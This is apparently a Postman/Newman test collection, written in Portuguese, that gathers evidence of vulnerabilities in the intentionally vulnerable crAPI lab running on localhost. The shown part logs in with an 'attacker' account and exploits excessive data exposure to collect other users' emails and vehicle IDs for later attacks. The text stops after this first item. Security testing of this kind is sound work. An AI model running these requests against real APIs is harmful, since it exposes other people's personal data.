{
  "info": {
    "name": "crAPI - Evidencias (Newman)",
    "description": "Colecao auto-suficiente para rodar via Newman e gerar o relatorio HTML de evidencias. Cada secao prepara seus proprios dados; cada assercao explica o que a resposta prova. Requer o crAPI local no ar.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "event": [
    {
      "listen": "prerequest",
      "script": {
        "type": "text/javascript",
        "exec": [
          "var base = pm.collectionVariables.get('base_url');",
          "if (!pm.collectionVariables.get('token_atacante')) {",
          "  pm.sendRequest({",
          "    url: base + '/identity/api/auth/login', method: 'POST',",
          "    header: {'Content-Type': 'application/json'},",
          "    body: {mode: 'raw', raw: JSON.stringify({email: pm.collectionVariables.get('email_atacante'), password: pm.collectionVariables.get('senha_atacante')})}",
          "  }, function (err, res) {",
          "    if (!err) { try { pm.collectionVariables.set('token_atacante', res.json().token); } catch (e) {} }",
          "  });",
          "}"
        ]
      }
    }
  ],
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:8888"
    },
    {
      "key": "email_atacante",
      "value": "atacante@teste.local"
    },
    {
      "key": "senha_atacante",
      "value": "Atacante@2026!"
    },
    {
      "key": "token_atacante",
      "value": ""
    },
    {
      "key": "leaked_vehicleid",
      "value": ""
    },
    {
      "key": "leaked_email",
      "value": ""
    },
    {
      "key": "order_id",
      "value": ""
    },
    {
      "key": "video_id",
      "value": ""
    },
    {
      "key": "forged_jwt",
      "value": ""
    }
  ],
  "item": [
    {
      "name": "03 - Excessive Data Exposure",
      "item": [
        {
          "name": "GET posts da comunidade (vaza email e vehicleid)",
          "request": {
            "method": "GET",
            "header": [
              {
                "key": "Authorization",
                "value": "Bearer {{token_atacante}}"
              }
            ],
            "url": {
              "raw": "{{base_url}}/community/api/v2/community/posts/recent",
              "host": [
                "{{base_url}}"
              ],
              "path": [
                "community",
                "api",
                "v2",
                "community",
                "posts",
                "recent"
              ]
            },
            "description": "API3. O JSON expoe email e vehicleid de cada autor. Guardados para os ataques seguintes."
          },
          "event": [
            {
              "listen": "test",
              "script": {
                "type": "text/javascript",
                "exec": [
                  "var j = pm.response.json();",
                  "var a = j.posts[0].author;",
                  "pm.collectionVariables.set('leaked_vehicleid', a.vehicleid);",
                  "pm.collectionVariables.set('leaked_email', a.email);",
                  "pm.test('HTTP 200', function(){ pm.response.to.have.status(200); });",
                  "pm.test('resposta vaza email e vehicleid de outros usuarios (nao aparecem na UI)', function(){",
                  "  pm.expect(a.email).to.be.a('string'); pm.expect(a.vehicleid).to.be.a('string');",
                  "});"
                ]
              }
            }
          ]
        }
      ]
    },
